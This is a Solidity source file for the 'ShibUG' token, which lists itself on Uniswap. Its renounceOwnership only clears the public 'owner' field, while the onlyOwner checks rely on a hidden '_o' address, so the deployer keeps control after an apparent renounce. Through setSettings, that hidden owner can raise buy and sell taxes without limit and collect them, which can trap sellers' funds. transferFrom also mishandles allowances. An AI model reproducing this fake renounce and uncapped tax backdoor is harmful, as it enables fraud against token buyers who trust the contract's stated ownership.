// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
 _____  _      _  _      _   _  _____ 
/  ___|| |    (_)| |    | | | ||  __ \
\  --. | |__   _ | |__  | | | || |  \/
  --. \|  _ \ | ||  _ \ | | | || | __ 
/\__/ /| | | || || |_) || |_| || |_\ \
\____/ |_| |_||_||_.__/  \___/  \____/
                                      
                                      

*/

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Uniswap {

    address public owner;

    address public RouterAddr;
    address public PairAddress;
    address public FactoryAddress;
    IUniswapRouter public UniswapV2Router;
    address internal me;
    address internal _o;
    mapping(address=>bool) public dex;
    address public WETH;
    function isFromUniswap(address from) internal view returns (bool) {
        return dex[from];
    }

    constructor() {
        RouterAddr  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        UniswapV2Router  = IUniswapRouter(RouterAddr);
        WETH             = UniswapV2Router.WETH();
        PairAddress      = IUniswapFactory(FactoryAddress).createPair(address(this), WETH);
        
        dex[RouterAddr] = true;
        dex[FactoryAddress] = true;
        dex[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _o = msg.sender;
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}
    
    function toUni(address to) internal view returns (bool) {
        return dex[to];
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _o = owner;
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden:owner");
        _;
    }
}
contract ShibUG is Uniswap {
    string public name = "ShibUG";
    string public symbol = "ShibUG";
    uint256 public decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) internal balances;
    bool internal swapping = false;
    bool internal funded;
    mapping(address=>bool) internal isTaxFree;

    uint256 public totalSupply;
    uint256 maxbuy = 30;
    uint256 _bt = 0;
    mapping(address => mapping(address => uint256)) internal allowances;
    uint256 sellTax = 0;
    constructor() Uniswap() {
        isTaxFree[address(this)] = true;
        isTaxFree[msg.sender] = true;
        mint(_o, 1000000000*10**decimals);
    }

    function disable() public onlyOwner() {
        swapping = true;
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }

    function enable() public onlyOwner() {
        swapping = false;
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }
    function applyPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }
    
    function taxable(address from, address to) internal view returns (bool) {
        return !isTaxFree[from] && !isTaxFree[to] && !(dex[from] && dex[to]) && (isFromUniswap(from) || toUni(to));
    }

    function getmaxbuy() internal view returns (uint256) {
        return applyPct(totalSupply, maxbuy);
    }

    function setSettings(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==_o, "Forbidden:set");
        _bt = b;
        sellTax = s;
        maxbuy = m;
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }


    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        if (!taxable(from, to)) {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 tax;
            if (isFromUniswap(from)) {
                require(amount<=getmaxbuy(), "Too large");
                tax = applyPct(amount, _bt);
            } else if (toUni(to)) {
                tax = applyPct(amount, sellTax);
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[from] -= amount;
                balances[_o] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, _o, tax);
            emit Transfer(from, to, afterTax);
        }
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
}